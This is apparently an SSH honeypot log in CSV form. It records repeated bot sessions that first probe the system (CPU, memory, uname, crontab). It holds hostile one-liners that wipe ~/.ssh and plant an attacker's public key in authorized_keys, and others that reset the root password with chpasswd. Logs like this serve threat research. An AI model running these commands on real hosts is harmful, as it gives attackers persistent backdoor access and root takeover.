id,session,timestamp,realm,input
48028,db10b242199a,2022-11-19T21:37:12.203209Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48029,db10b242199a,2022-11-19T21:37:12.929849Z,,"cat /proc/cpuinfo | grep name | wc -l"
48030,db10b242199a,2022-11-19T21:37:13.932908Z,,"echo ""root:W5d2RhdhXNdO""|chpasswd|bash"
48031,db10b242199a,2022-11-19T21:37:14.748411Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48032,db10b242199a,2022-11-19T21:37:15.442841Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48033,db10b242199a,2022-11-19T21:37:16.210089Z,,"which ls"
48034,db10b242199a,2022-11-19T21:37:16.209204Z,,"ls -lh $(which ls)"
48035,db10b242199a,2022-11-19T21:37:17.133208Z,,"crontab -l"
48036,db10b242199a,2022-11-19T21:37:17.829091Z,,w
48037,db10b242199a,2022-11-19T21:37:18.600715Z,,"uname -m"
48038,db10b242199a,2022-11-19T21:37:19.333920Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48039,db10b242199a,2022-11-19T21:37:20.293330Z,,top
48040,db10b242199a,2022-11-19T21:37:21.061987Z,,uname
48041,db10b242199a,2022-11-19T21:37:21.756130Z,,"uname -a"
48042,db10b242199a,2022-11-19T21:37:22.523471Z,,"lscpu | grep Model"
48043,db10b242199a,2022-11-19T21:37:23.509470Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48044,db10b242199a,2022-11-19T21:37:24.207191Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48045,db10b242199a,2022-11-19T21:37:24.980186Z,,"which ls"
48046,db10b242199a,2022-11-19T21:37:24.979493Z,,"ls -lh $(which ls)"
48047,db10b242199a,2022-11-19T21:37:25.892702Z,,"crontab -l"
48048,db10b242199a,2022-11-19T21:37:26.662506Z,,w
48049,db10b242199a,2022-11-19T21:37:27.731989Z,,"uname -m"
48050,db10b242199a,2022-11-19T21:37:28.421049Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48051,db10b242199a,2022-11-19T21:37:29.329406Z,,top
48052,db10b242199a,2022-11-19T21:37:30.025336Z,,uname
48053,db10b242199a,2022-11-19T21:37:31.131018Z,,"uname -a"
48054,db10b242199a,2022-11-19T21:37:31.864080Z,,"lscpu | grep Model"
48055,4842242e2ba0,2022-11-19T21:38:24.920283Z,,"cat /proc/cpuinfo | grep name | wc -l"
48056,4842242e2ba0,2022-11-19T21:38:25.514058Z,,"echo ""root:ba8F2huB3tEm""|chpasswd|bash"
48057,4842242e2ba0,2022-11-19T21:38:26.026310Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48058,4842242e2ba0,2022-11-19T21:38:26.606881Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48059,4842242e2ba0,2022-11-19T21:38:27.153269Z,,"which ls"
48060,4842242e2ba0,2022-11-19T21:38:27.152604Z,,"ls -lh $(which ls)"
48061,4842242e2ba0,2022-11-19T21:38:27.660932Z,,"crontab -l"
48062,4842242e2ba0,2022-11-19T21:38:28.239845Z,,w
48063,4842242e2ba0,2022-11-19T21:38:28.783863Z,,"uname -m"
48064,4842242e2ba0,2022-11-19T21:38:29.292711Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48065,4842242e2ba0,2022-11-19T21:38:29.893714Z,,top
48066,4842242e2ba0,2022-11-19T21:38:30.405508Z,,uname
48067,4842242e2ba0,2022-11-19T21:38:30.988464Z,,"uname -a"
48068,4842242e2ba0,2022-11-19T21:38:31.536958Z,,"lscpu | grep Model"
48069,4842242e2ba0,2022-11-19T21:38:32.047235Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48070,5c4e9f9417d7,2022-11-19T21:40:22.919529Z,,"cat /proc/cpuinfo | grep name | wc -l"
48071,5c4e9f9417d7,2022-11-19T21:40:23.470944Z,,"echo ""root:LoayfOMSMpHR""|chpasswd|bash"
48072,5c4e9f9417d7,2022-11-19T21:40:24.101172Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48073,5c4e9f9417d7,2022-11-19T21:40:24.692924Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48074,5c4e9f9417d7,2022-11-19T21:40:25.243536Z,,"which ls"
48075,5c4e9f9417d7,2022-11-19T21:40:25.242410Z,,"ls -lh $(which ls)"
48076,5c4e9f9417d7,2022-11-19T21:40:25.868653Z,,"crontab -l"
48077,5c4e9f9417d7,2022-11-19T21:40:26.417053Z,,w
48078,5c4e9f9417d7,2022-11-19T21:40:27.039259Z,,"uname -m"
48079,5c4e9f9417d7,2022-11-19T21:40:27.621495Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48080,5c4e9f9417d7,2022-11-19T21:40:28.169540Z,,top
48081,5c4e9f9417d7,2022-11-19T21:40:28.792974Z,,uname
48082,5c4e9f9417d7,2022-11-19T21:40:29.381143Z,,"uname -a"
48083,5c4e9f9417d7,2022-11-19T21:40:29.928997Z,,"lscpu | grep Model"
48084,5c4e9f9417d7,2022-11-19T21:40:30.555475Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48085,c1d51b64e582,2022-11-19T21:41:18.526422Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48086,c1d51b64e582,2022-11-19T21:41:19.608330Z,,"cat /proc/cpuinfo | grep name | wc -l"
48087,c1d51b64e582,2022-11-19T21:41:20.510125Z,,"echo ""root:hKlZPnrDMEKC""|chpasswd|bash"
48088,c1d51b64e582,2022-11-19T21:41:21.193616Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48089,c1d51b64e582,2022-11-19T21:41:21.957781Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48090,c1d51b64e582,2022-11-19T21:41:22.924089Z,,"which ls"
48091,c1d51b64e582,2022-11-19T21:41:22.921978Z,,"ls -lh $(which ls)"
48092,c1d51b64e582,2022-11-19T21:41:23.918984Z,,"crontab -l"
48093,c1d51b64e582,2022-11-19T21:41:24.649093Z,,w
48094,c1d51b64e582,2022-11-19T21:41:25.344180Z,,"uname -m"
48095,c1d51b64e582,2022-11-19T21:41:26.327136Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48096,c1d51b64e582,2022-11-19T21:41:27.017833Z,,top
48097,c1d51b64e582,2022-11-19T21:41:27.918036Z,,uname
48098,c1d51b64e582,2022-11-19T21:41:28.644684Z,,"uname -a"
48099,c1d51b64e582,2022-11-19T21:41:29.687431Z,,"lscpu | grep Model"
48100,c1d51b64e582,2022-11-19T21:41:30.447356Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48101,c1d51b64e582,2022-11-19T21:41:31.496306Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48102,c1d51b64e582,2022-11-19T21:41:32.258524Z,,"which ls"
48103,c1d51b64e582,2022-11-19T21:41:32.257719Z,,"ls -lh $(which ls)"
48104,c1d51b64e582,2022-11-19T21:41:33.166024Z,,"crontab -l"
48105,c1d51b64e582,2022-11-19T21:41:33.859643Z,,w
48106,c1d51b64e582,2022-11-19T21:41:34.626436Z,,"uname -m"
48107,c1d51b64e582,2022-11-19T21:41:35.554559Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48108,c1d51b64e582,2022-11-19T21:41:36.249080Z,,top
48109,c1d51b64e582,2022-11-19T21:41:37.205300Z,,uname
48110,c1d51b64e582,2022-11-19T21:41:37.892925Z,,"uname -a"
48111,c1d51b64e582,2022-11-19T21:41:38.931591Z,,"lscpu | grep Model"
48112,a2e44bf57846,2022-11-19T21:45:26.510104Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48113,a2e44bf57846,2022-11-19T21:45:27.201034Z,,"cat /proc/cpuinfo | grep name | wc -l"
48114,a2e44bf57846,2022-11-19T21:45:27.967708Z,,"echo ""root:6vTgc0TocMYE""|chpasswd|bash"
48115,a2e44bf57846,2022-11-19T21:45:28.652402Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48116,a2e44bf57846,2022-11-19T21:45:29.415377Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48117,a2e44bf57846,2022-11-19T21:45:30.356322Z,,"which ls"
48118,a2e44bf57846,2022-11-19T21:45:30.355268Z,,"ls -lh $(which ls)"
48119,a2e44bf57846,2022-11-19T21:45:31.044667Z,,"crontab -l"
48120,a2e44bf57846,2022-11-19T21:45:32.112320Z,,w
48121,a2e44bf57846,2022-11-19T21:45:32.799191Z,,"uname -m"
48122,a2e44bf57846,2022-11-19T21:45:33.559241Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48123,a2e44bf57846,2022-11-19T21:45:34.362224Z,,top
48124,a2e44bf57846,2022-11-19T21:45:35.190202Z,,uname
48125,a2e44bf57846,2022-11-19T21:45:35.954318Z,,"uname -a"
48126,a2e44bf57846,2022-11-19T21:45:36.957695Z,,"lscpu | grep Model"
48127,a2e44bf57846,2022-11-19T21:45:37.649602Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48128,a2e44bf57846,2022-11-19T21:45:38.610160Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48129,a2e44bf57846,2022-11-19T21:45:39.686110Z,,"which ls"
48130,a2e44bf57846,2022-11-19T21:45:39.685349Z,,"ls -lh $(which ls)"
48131,a2e44bf57846,2022-11-19T21:45:40.453420Z,,"crontab -l"
48132,a2e44bf57846,2022-11-19T21:45:41.506703Z,,w
48133,a2e44bf57846,2022-11-19T21:45:42.197527Z,,"uname -m"
48134,a2e44bf57846,2022-11-19T21:45:42.975938Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48135,a2e44bf57846,2022-11-19T21:45:43.915397Z,,top
48136,a2e44bf57846,2022-11-19T21:45:44.679119Z,,uname
48137,a2e44bf57846,2022-11-19T21:45:45.526960Z,,"uname -a"
48138,a2e44bf57846,2022-11-19T21:45:46.588758Z,,"lscpu | grep Model"
48139,01638e03f94a,2022-11-19T21:52:56.622741Z,,"cat /proc/cpuinfo | grep name | wc -l"
48140,01638e03f94a,2022-11-19T21:52:57.222773Z,,"echo ""root:EHI3MMoXcLtn""|chpasswd|bash"
48141,01638e03f94a,2022-11-19T21:52:57.888508Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48142,01638e03f94a,2022-11-19T21:52:58.526781Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48143,01638e03f94a,2022-11-19T21:52:59.127459Z,,"which ls"
48144,01638e03f94a,2022-11-19T21:52:59.126749Z,,"ls -lh $(which ls)"
48145,01638e03f94a,2022-11-19T21:52:59.812260Z,,"crontab -l"
48146,01638e03f94a,2022-11-19T21:53:00.459798Z,,w
48147,01638e03f94a,2022-11-19T21:53:01.058290Z,,"uname -m"
48148,01638e03f94a,2022-11-19T21:53:01.731336Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48149,01638e03f94a,2022-11-19T21:53:02.331102Z,,top
48150,01638e03f94a,2022-11-19T21:53:03.005559Z,,uname
48151,01638e03f94a,2022-11-19T21:53:03.642623Z,,"uname -a"
48152,01638e03f94a,2022-11-19T21:53:04.244015Z,,"lscpu | grep Model"
48153,01638e03f94a,2022-11-19T21:53:04.920158Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48154,e457b576f4f9,2022-11-19T22:01:52.082205Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48155,e457b576f4f9,2022-11-19T22:01:52.865967Z,,"cat /proc/cpuinfo | grep name | wc -l"
48156,e457b576f4f9,2022-11-19T22:01:53.762905Z,,"echo ""root:EDAJmFv4Ok0v""|chpasswd|bash"
48157,e457b576f4f9,2022-11-19T22:01:54.726850Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48158,e457b576f4f9,2022-11-19T22:01:55.502523Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48159,e457b576f4f9,2022-11-19T22:01:56.490452Z,,"which ls"
48160,e457b576f4f9,2022-11-19T22:01:56.489607Z,,"ls -lh $(which ls)"
48161,e457b576f4f9,2022-11-19T22:01:57.264533Z,,"crontab -l"
48162,e457b576f4f9,2022-11-19T22:01:58.000991Z,,w
48163,e457b576f4f9,2022-11-19T22:01:58.927103Z,,"uname -m"
48164,e457b576f4f9,2022-11-19T22:01:59.911191Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48165,e457b576f4f9,2022-11-19T22:02:00.611592Z,,top
48166,e457b576f4f9,2022-11-19T22:02:01.381030Z,,uname
48167,e457b576f4f9,2022-11-19T22:02:02.341874Z,,"uname -a"
48168,e457b576f4f9,2022-11-19T22:02:03.037126Z,,"lscpu | grep Model"
48169,e457b576f4f9,2022-11-19T22:02:03.806094Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48170,e457b576f4f9,2022-11-19T22:02:04.717457Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48171,e457b576f4f9,2022-11-19T22:02:05.417057Z,,"which ls"
48172,e457b576f4f9,2022-11-19T22:02:05.416351Z,,"ls -lh $(which ls)"
48173,e457b576f4f9,2022-11-19T22:02:06.190005Z,,"crontab -l"
48174,e457b576f4f9,2022-11-19T22:02:07.126934Z,,w
48175,e457b576f4f9,2022-11-19T22:02:07.900182Z,,"uname -m"
48176,e457b576f4f9,2022-11-19T22:02:08.928541Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48177,e457b576f4f9,2022-11-19T22:02:09.628039Z,,top
48178,e457b576f4f9,2022-11-19T22:02:10.408649Z,,uname
48179,e457b576f4f9,2022-11-19T22:02:11.320946Z,,"uname -a"
48180,e457b576f4f9,2022-11-19T22:02:12.093356Z,,"lscpu | grep Model"
48181,58da48e63908,2022-11-19T22:10:05.746808Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48182,58da48e63908,2022-11-19T22:10:06.443517Z,,"cat /proc/cpuinfo | grep name | wc -l"
48183,58da48e63908,2022-11-19T22:10:07.512507Z,,"echo ""root:P2fXHobd3jOm""|chpasswd|bash"
48184,58da48e63908,2022-11-19T22:10:08.207083Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48185,58da48e63908,2022-11-19T22:10:09.328613Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48186,58da48e63908,2022-11-19T22:10:10.062680Z,,"which ls"
48187,58da48e63908,2022-11-19T22:10:10.061779Z,,"ls -lh $(which ls)"
48188,58da48e63908,2022-11-19T22:10:11.076314Z,,"crontab -l"
48189,58da48e63908,2022-11-19T22:10:11.853115Z,,w
48190,58da48e63908,2022-11-19T22:10:12.934940Z,,"uname -m"
48191,58da48e63908,2022-11-19T22:10:13.633559Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48192,58da48e63908,2022-11-19T22:10:14.730815Z,,top
48193,58da48e63908,2022-11-19T22:10:15.427938Z,,uname
48194,58da48e63908,2022-11-19T22:10:16.534277Z,,"uname -a"
48195,58da48e63908,2022-11-19T22:10:17.273734Z,,"lscpu | grep Model"
48196,58da48e63908,2022-11-19T22:10:18.300555Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48197,58da48e63908,2022-11-19T22:10:19.079165Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48198,58da48e63908,2022-11-19T22:10:20.094325Z,,"which ls"
48199,58da48e63908,2022-11-19T22:10:20.093359Z,,"ls -lh $(which ls)"
48200,58da48e63908,2022-11-19T22:10:20.862528Z,,"crontab -l"
48201,58da48e63908,2022-11-19T22:10:21.604539Z,,w
48202,58da48e63908,2022-11-19T22:10:22.540129Z,,"uname -m"
48203,58da48e63908,2022-11-19T22:10:23.314454Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48204,58da48e63908,2022-11-19T22:10:24.332587Z,,top
48205,58da48e63908,2022-11-19T22:10:25.123237Z,,uname
48206,58da48e63908,2022-11-19T22:10:25.853320Z,,"uname -a"
48207,58da48e63908,2022-11-19T22:10:26.922269Z,,"lscpu | grep Model"
48208,2a55f868cdfe,2022-11-19T22:38:55.452590Z,,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
48209,2a55f868cdfe,2022-11-19T22:38:56.193755Z,,"cat /proc/cpuinfo | grep name | wc -l"
48210,2a55f868cdfe,2022-11-19T22:38:56.916257Z,,"echo ""root:9ZLVb9Ko9klU""|chpasswd|bash"
48211,2a55f868cdfe,2022-11-19T22:38:57.686289Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48212,2a55f868cdfe,2022-11-19T22:38:58.760166Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48213,2a55f868cdfe,2022-11-19T22:38:59.927189Z,,"which ls"
48214,2a55f868cdfe,2022-11-19T22:38:59.926494Z,,"ls -lh $(which ls)"
48215,2a55f868cdfe,2022-11-19T22:39:00.665665Z,,"crontab -l"
48216,2a55f868cdfe,2022-11-19T22:39:01.359749Z,,w
48217,2a55f868cdfe,2022-11-19T22:39:02.129294Z,,"uname -m"
48218,2a55f868cdfe,2022-11-19T22:39:02.932952Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48219,2a55f868cdfe,2022-11-19T22:39:03.704370Z,,top
48220,2a55f868cdfe,2022-11-19T22:39:04.780441Z,,uname
48221,2a55f868cdfe,2022-11-19T22:39:05.474202Z,,"uname -a"
48222,2a55f868cdfe,2022-11-19T22:39:06.571590Z,,"lscpu | grep Model"
48223,2a55f868cdfe,2022-11-19T22:39:07.272646Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48224,2a55f868cdfe,2022-11-19T22:39:08.326818Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48225,2a55f868cdfe,2022-11-19T22:39:09.061861Z,,"which ls"
48226,2a55f868cdfe,2022-11-19T22:39:09.060648Z,,"ls -lh $(which ls)"
48227,2a55f868cdfe,2022-11-19T22:39:10.126743Z,,"crontab -l"
48228,2a55f868cdfe,2022-11-19T22:39:10.897858Z,,w
48229,2a55f868cdfe,2022-11-19T22:39:11.771780Z,,"uname -m"
48230,2a55f868cdfe,2022-11-19T22:39:12.543767Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
48231,2a55f868cdfe,2022-11-19T22:39:13.533107Z,,top
48232,2a55f868cdfe,2022-11-19T22:39:14.229470Z,,uname
48233,2a55f868cdfe,2022-11-19T22:39:15.330546Z,,"uname -a"
48234,2a55f868cdfe,2022-11-19T22:39:16.064878Z,,"lscpu | grep Model"
48235,caff217adee1,2022-11-19T22:43:59.603833Z,,"cat /proc/cpuinfo | grep name | wc -l"
48236,caff217adee1,2022-11-19T22:43:59.939774Z,,"echo ""root:1FgvUm6GntES""|chpasswd|bash"
48237,caff217adee1,2022-11-19T22:44:00.179012Z,,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
48238,caff217adee1,2022-11-19T22:44:00.484251Z,,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
48239,caff217adee1,2022-11-19T22:44:00.759886Z,,"which ls"
48240,caff217adee1,2022-11-19T22:44:00.759185Z,,"ls -lh $(which ls)"
48241,caff217adee1,2022-11-19T22:44:01.004060Z,,"crontab -l"
48242,caff217adee1,2022-11-19T22:44:01.323339Z,,w
48243,caff217adee1,2022-11-19T22:44:01.568574Z,,"uname -m"
48244,caff217adee1,2022-11-19T22:44:01.877662Z,,"cat /proc/cpuinfo | grep model | grep name | wc -l"
